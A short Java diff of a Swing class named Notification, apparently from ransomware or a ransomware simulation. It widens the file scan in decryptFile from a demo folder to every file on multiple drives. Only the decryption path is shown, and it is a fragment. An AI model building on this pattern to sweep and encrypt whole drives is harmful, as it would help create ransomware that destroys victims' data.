@@ -173,8 +173,7 @@ public class Notification extends javax.swing.JFrame {
     }
     
     private boolean decryptFile(String key) {
-        File dir = new File(new File("./filedemo").getAbsolutePath());
-        List<String> fileList = FileUtils.readAllFileinFolder(new ArrayList<>(),dir);
+        List<String> fileList = FileUtils.readAllFileInMultiDrive();
         List<String> fillterFileList = FileUtils.fillterFile(fileList);
         fillterFileList.stream().forEach(path->{
             try {
